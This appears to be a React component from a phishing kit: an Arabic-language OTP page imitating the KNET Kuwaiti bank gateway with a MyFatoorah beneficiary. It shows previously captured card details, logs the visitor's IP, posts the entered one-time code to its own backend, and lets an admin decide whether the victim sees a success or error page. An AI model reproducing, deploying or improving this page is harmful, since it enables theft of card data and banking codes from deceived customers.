import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import '../Style/Payment.css';

const Code = () => {
  const navigate = useNavigate();
  const [otp, setOtp] = useState('');
  const [userIP, setUserIP] = useState('');
  const [isLoading, setIsLoading] = useState(true);
  const [cardData, setCardData] = useState(null);
  const [totalAmount, setTotalAmount] = useState(0);
  const [currency, setCurrency] = useState('');
  const [timeLeft, setTimeLeft] = useState(120); // 120 ثانية = دقيقتين
  
  // دالة للحصول على IP المستخدم
  const fetchUserIP = async () => {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      setUserIP(data.ip);
    } catch (err) {
      console.error('فشل في الحصول على IP:', err);
      setUserIP('غير معروف');
    }
  };

  useEffect(() => {
    fetchUserIP();
    
    // جلب بيانات البطاقة من localStorage
    const storedCardData = localStorage.getItem('cardData');
    if (storedCardData) {
      setCardData(JSON.parse(storedCardData));
    }
    
    // جلب المبلغ والعملة من localStorage
    const storedTotal = localStorage.getItem('orderTotal');
    const storedCurrency = localStorage.getItem('orderCurrency');
    
    if (storedTotal) {
      setTotalAmount(parseFloat(storedTotal));
    }
    
    if (storedCurrency) {
      setCurrency(storedCurrency);
    }
    
    const timer = setTimeout(() => {
      setIsLoading(false);
    }, 3000);
    
    return () => clearTimeout(timer);
  }, []);

  // عداد تنازلي
  useEffect(() => {
    if (timeLeft === 0) return;
    
    const timerId = setTimeout(() => {
      setTimeLeft(timeLeft - 1);
    }, 1000);
    
    return () => clearTimeout(timerId);
  }, [timeLeft]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (!otp) {
      alert('يرجى إدخال رمز OTP');
      return;
    }

    try {
      const otpData = { otp, userIP };
      const response = await fetch(`${process.env.REACT_APP_API_BASE_URL}/api/payment/submit-otp`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          // إضافة رأس التوكن
          'Authorization': `Bearer ${localStorage.getItem('authToken')}`
        },
        body: JSON.stringify(otpData)
      });

      if (response.ok) {
        // جلب بيانات المستخدم باستخدام التوكن
        const userRes = await fetch(`${process.env.REACT_APP_API_BASE_URL}/api/protected/user`, {
          headers: {
            'Authorization': `Bearer ${localStorage.getItem('authToken')}`
          }
        });
        
        if (userRes.ok) {
          const userData = await userRes.json();
          
          // التوجيه بناءً على إعدادات الإدمن
          if (userData.user.redirectPage === 'success') {
            navigate('/success');
          } else {
            navigate('/wrong');
          }
        } else {
          navigate('/wrong');
        }
      } else {
        navigate('/wrong');
      }
    } catch (error) {
      alert('حدث خطأ: ' + error.message);
      navigate('/wrong');
    }
  };

  const handleCancel = () => {
    navigate('/payment');
  };

  if (!cardData) {
    return (
      <div className="payment-loading-container">
        <div className="payment-loading-spinner"></div>
        <p>جارٍ تحميل البيانات...</p>
      </div>
    );
  }

  // تنسيق رقم البطاقة
  const formatCardNumber = (cardNumber) => {
    if (cardNumber.length >= 12) {
      const firstSix = cardNumber.substring(0, 6);
      const lastPart = cardNumber.substring(12);
      return `${firstSix}******${lastPart}`;
    }
    return cardNumber;
  };

  // تنسيق الوقت
  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs < 10 ? '0' : ''}${secs}`;
  };

  return (
    <div className="payment-container">
      {isLoading && (
        <div className="loading-overlayy">
          <div className="spinnerr">
            <img 
              src="68315b_30dbad1140034a3da3c59278654e1655~mv2.gif" 
              alt="Loading" 
              className="loading-giff"
            />
          </div>
        </div>
      )}    
    
      <div className="payment-header">
        <img src="/images/Bank.jpg" alt="Bank Header" className="bank-header-img" />
      </div>

      <div className="beneficiary-section">
        <div className="beneficiary-logo">
          <img src="/images/Bank-logo.jpg" alt="Bank Logo" className="bank-logo-img" />
        </div>
        <div className="did did1">
          <div className="beneficiary-title">المستفيد:</div>
          <div className="beneficiary-name">MyFatoorah</div>
        </div> 
        <div className="did">
          <div className="beneficiary-title">المبلغ:</div>
          <div className="beneficiary-name">
            {currency} {totalAmount.toFixed(3)}
          </div>
        </div>
      </div>

      <form onSubmit={handleSubmit} className="payment-form-container">
        <div className="payment-form">
          <div className="form-groupp">
            <div className="form-label">
              <label>رقم بطاقة الصرف الآلي:</label>
            </div>
            <div className="form-roww form-roww1">
              <div className="card-number-input">
                <div className="card-info-display">
                  {formatCardNumber(cardData.cardNumber)}
                </div>
              </div>  
            </div>
          </div>
          
          <div className="form-groupp">
            <div className="form-label">
              <label>شهر إنتهاء الصلاحية  :</label>
            </div>   
            <div className="form-roww form-roww2">
              <div className="mm">             
                <div className="expiry-info-display">
                  {cardData.expiryMonth}
                </div>
              </div>  
            </div>
          </div>
          <div className="form-groupp">
            <div className="form-label">
              <label>سنة إنتهاء الصلاحية  :</label>
            </div>   
            <div className="form-roww form-roww2">
              <div className="yy">
                <div className="expiry-info-display">
                  {cardData.expiryYear}
                </div>
              </div>   
            </div>
          </div>
          <div className="form-groupp form-groupp3">
            <div className="form-label">   
              <label>الرقم السري:</label>
            </div>    
            <div className="form-roww form-roww3">  
              <div className="cvv-input">
                <div className="cvv-info-display">
                  ****
                </div>
              </div>        
            </div>
          </div>
          
          <div className="form-groupp">
            <div className="form-label">   
              <label htmlFor="otp">رمز OTP:</label>
            </div>    
            <div className="form-roww form-roww0">  
              <div className="otp-input">
                <input
                  type="text"
                  id="otp"
                  className="otpInp"
                  value={otp}
                  onChange={(e) => setOtp(e.target.value)}
                  placeholder="أدخل الرمز المرسل إليك"
                  maxLength={6}
                  autoComplete="off"
                />
                <div className={`countdown-timer ${timeLeft < 30 ? 'countdown-warning' : ''}`}>
                  {formatTime(timeLeft)}
                </div>
              </div>        
            </div>
          </div>
        </div>   
        <div className="form-buttons">
          <button type="submit" className="submitt-btn">
            إرسال
          </button>
          <button type="button" className="cancel-btn" onClick={handleCancel}>
            إلغاء
          </button>          
        </div>
      </form>

      <div className="payment-footer">
        جميع الحقوق محفوظة © 2025
        <br />
        <p>شركة الخدمات المصرفية الآلية المشتركة – كي نت</p>
      </div>
    </div>
  );
};

export default Code;